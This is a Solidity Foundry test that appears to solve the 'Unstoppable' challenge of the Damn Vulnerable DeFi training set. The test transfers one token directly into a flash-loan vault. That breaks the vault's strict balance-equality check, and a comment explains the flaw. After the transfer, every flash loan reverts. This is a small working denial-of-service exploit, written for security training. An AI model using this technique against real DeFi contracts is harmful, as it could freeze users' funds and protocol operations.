// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {StdCheats} from "forge-std/StdCheats.sol";

import {ReceiverUnstoppable} from "../src/1. unstoppable/ReceiverUnstoppable.sol";
import {UnstoppableVault} from "../src/1. unstoppable/UnstoppableVault.sol";
import {DamnValuableToken} from "../src/DamnValuableToken.sol";


contract UnstoppableTest is StdCheats, Test {

uint256 constant STARTING_VAULT_BALANCE = 10000000 ether;
uint256 constant STARTING_ATTACKER_BALANCE = 10 ether;

address public poolOwner = address(1);


DamnValuableToken public token;
ReceiverUnstoppable public attacker;
UnstoppableVault public vault;

    function setUp() public {

        token = new DamnValuableToken();
        vault = new UnstoppableVault(token, poolOwner, poolOwner);
        attacker = new ReceiverUnstoppable(address(vault));

        token.approve(address(vault), STARTING_VAULT_BALANCE);
        vault.deposit(STARTING_VAULT_BALANCE, poolOwner);
        token.transfer(address(attacker), STARTING_ATTACKER_BALANCE);

        assertEq(token.balanceOf(address(vault)), STARTING_VAULT_BALANCE);
        assertEq(token.balanceOf(address(attacker)), STARTING_ATTACKER_BALANCE);

    }

    // the vault contract does NOT track the tokens sent directly using the ERC20 transfer function
    // strict equalities should be avoided is some cases
    // if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();

    function testAttack() public {

        vm.startPrank(address(attacker));
        token.transfer(address(vault), 1 ether);
        vm.stopPrank();


        assertEq(token.balanceOf(address(attacker)), STARTING_ATTACKER_BALANCE - 1 ether);

        vm.expectRevert(UnstoppableVault.InvalidBalance.selector);

        vault.flashLoan(attacker, address(token), 1 , "");
    }

}